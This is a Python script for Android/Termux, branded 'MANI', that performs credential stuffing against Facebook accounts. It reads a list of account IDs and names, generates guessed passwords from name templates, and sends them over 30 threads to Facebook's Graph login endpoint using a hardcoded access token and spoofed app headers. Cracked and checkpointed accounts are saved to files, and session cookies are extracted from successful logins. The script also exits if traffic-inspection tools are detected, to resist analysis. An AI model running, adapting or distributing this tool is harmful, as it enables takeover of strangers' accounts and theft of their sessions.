import os,base64

#os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('Delete Http Canary');sys.exit()
except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'
if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
	pass
else:sys.exit()

import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed 

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]
logo = """
\033[97;1m   ##     ##    ###    ##    ## #### 
\033[96;1m   ###   ###   ## ##   ###   ##  ##  
\033[93;1m   #### ####  ##   ##  ####  ##  ##  
\033[94;1m   ## ### ## ##     ## ## ## ##  ##  
\033[97;1m   ##     ## ######### ##  ####  ## 
\033[91;1m   ##     ## ##     ## ##   ###  ##  
\033[92;1m   ##     ## ##     ## ##    ## #### 
                                                               
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMANI
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Usman Rajpoot
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mUSMAN-RAJPOOT
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
\033[1;37m══════════════════════════════════════════\n"""
def clear ():
	os.system('clear')
	print (logo)
def linex():
	print('\033[1;37m)══════════════════════════════════════════')
def Main():
	clear()
	print("\033[1;32m[1] \033[1;37mFILE CLONING")
	print("\033[1;32m[2] \033[1;33mCONTACT ADMIN")
	print("\033[1;33m[0]\033[1;33m EXIT");linex()
	g = input("\033[1;32m[?] \033[1;37mChoose :- ")
	if g == '1':
		file()

	if g == '2':
		os.system("xdg-open ");Main()
	if g =='0':
		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
	else:
		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
		

l = []
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/MANI.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        linex();print(f"\033[1;32m[!]\033[1;31m File location not found ");time.sleep(3)
        Main()
     
    method()
    exit()
    
    
def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'\033[1;32m[?]\033[1;37m ENTER PASS LIMIT : ');clear() 
        if lp.isnumeric():
            print('\033[1;32m[•] \033[1;32mEXAMPLE :\033[1;37m first last,firtslast,first123');linex()
            for x in range(int(lp)):
                totalpass.append(input(f'\033[1;32m[?]\033[1;37m PUT PASSWORD\033[1;32m {x+1} : \033[1;37m '))
            pass
        else:
            linex();print(f"\033[1;32m[×] \033[1;31mONLY NUMERIC NUMBER")
            exit()
    clear()
    print(f'\033[1;32m[1] \033[1;37mMETHOD\033[1;32m > \033[1;37m1 ');linex()
    m=input(f"\033[1;32m[?] \033[1;37mCHOOSE :  ");clear()
    cpok=input('\033[1;32m[?] \033[1;37mSHOW CP ACCOUNT \033[1;32m(y/n) :\033[1;37m ')
 
    os.system("clear")
    print(logo) 
    
    print(f'\033[1;32m(√) Total IDs : \033[1;32m'+str(len(accounts)))
    
    print(f"\x1b[38;5;208m(!) Use Flight Mode For Speed UP");print('\033[1;37m(<•>)══════════════════════════════════════════')
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\r\033[1;97m[MANI]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:     
            heads = "Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA"
            heads = "Mozilla/5.0 (Linux; Android 8.1.0; GLi Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
            heads = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]"
            heads = "Mozilla/5.0 (Linux; Android 12; Nokia G60 5G Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\r\033[1;32m[USMAN-OK] '+acc+' [✓] '+pword+'  ')
                open('/sdcard/MANI-OK.txt','a').write(f'{acc} [✓] {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\r\033[1;37m[USMAN-CP] '+acc+' [•] '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/MANI-CP.txt','a').write(f'{acc} [•] {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    
    
    if m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    linex();print("\n\033[1;32m[✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[✓] \033[1;31mPRESS ENTER TO BACK ");Main()
      
Main()